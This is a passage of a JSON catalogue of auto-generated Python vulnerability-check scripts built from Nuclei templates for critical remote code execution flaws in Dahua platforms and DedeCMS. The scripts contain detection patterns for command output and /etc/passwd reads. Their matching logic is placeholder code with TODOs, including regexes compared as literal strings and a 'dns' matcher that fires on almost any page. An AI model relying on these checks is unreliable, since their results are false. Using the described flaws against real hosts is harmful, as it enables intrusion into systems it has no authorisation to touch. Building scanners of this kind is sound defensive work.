re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Dahua 'GetClassValue' - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dahua_icc_getclassvalue_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dahua-icc-getclassvalue-rce\nName: Dahua 'GetClassValue' - Remote Code Execution\nSeverity: critical\nDescription: Remote Code Execution Vulnerability in Dahua Intelligent IoT Integrated Management Platform via GetClassValue.jsp.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dahua_icc_getclassvalue_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dahua-icc-getclassvalue-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Dahua 'GetClassValue' - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Dahua 'GetClassValue' - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dahua_icc_getclassvalue_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "rce",
          "java",
          "dahua",
          "iot",
          "unauth",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_dahua_wpms_rce",
        "name": "Dahua Smart Park Integrated Management Platform - Remote Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Dahua Smart Park Integrated Management Platform is vulnerable to RCE.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'autoCommit, set property error' | mot(s) 'dns'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dahua-wpms-rce\nName: Dahua Smart Park Integrated Management Platform - Remote Command Execution\nSeverity: critical\nDescription: Dahua Smart Park Integrated Management Platform is vulnerable to RCE.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dahua_wpms_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dahua-wpms-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Dahua Smart Park Integrated Management Platform - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'autoCommit, set property error' | mot(s) 'dns'\"\n\n        # Simple word matcher simulation\n        matchers = ['autoCommit, set property error', 'dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Dahua Smart Park Integrated Management Platform - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dahua_wpms_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dahua-wpms-rce\nName: Dahua Smart Park Integrated Management Platform - Remote Command Execution\nSeverity: critical\nDescription: Dahua Smart Park Integrated Management Platform is vulnerable to RCE.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dahua_wpms_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dahua-wpms-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Dahua Smart Park Integrated Management Platform - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'autoCommit, set property error' | mot(s) 'dns'\"\n\n        # Simple word matcher simulation\n        matchers = ['autoCommit, set property error', 'dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Dahua Smart Park Integrated Management Platform - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dahua_wpms_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "rce",
          "dahua",
          "wpms",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_dedecms_rce",
        "name": "DedeCMS 5.8.1-beta - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "DedeCMS 5.8.1-beta is susceptible to remote code execution via a variable override vulnerability that allows an attacker to construct malicious code with template file inclusion without proper authorization, thus possibly obtaining sensitive information, modifying data, and/or gaining full control over a compromised system without entering necessary credentials.",
        "severity": "critical",
        "detection": "[AND] regex ['root:[x*]:0:0'] | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dedecms-rce\nName: DedeCMS 5.8.1-beta - Remote Code Execution\nSeverity: critical\nDescription: DedeCMS 5.8.1-beta is susceptible to remote code execution via a variable override vulnerability that allows an attacker to construct malicious code with template file inclusion without proper authorization, thus possibly obtaining sensitive information, modifying data, and/or gaining full control over a compromised system without entering necessary credentials.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dedecms_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dedecms-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"DedeCMS 5.8.1-beta - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:[x*]:0:0'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['root:[x*]:0:0']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"DedeCMS 5.8.1-beta - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dedecms_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dedecms-rce\nName: DedeCMS 5.8.1-beta - Remote Code Execution\nSeverity: critical\nDescription: DedeCMS 5.8.1-beta is susceptible to remote code execution via a variable override vulnerability that allows an attacker to construct malicious code with template file inclusion without proper authorization, thus possibly obtaining sensitive information, modifying data, and/or gaining full control over a compromised system without entering necessary credentials.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dedecms_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dedecms-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"DedeCMS 5.8.1-beta - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def 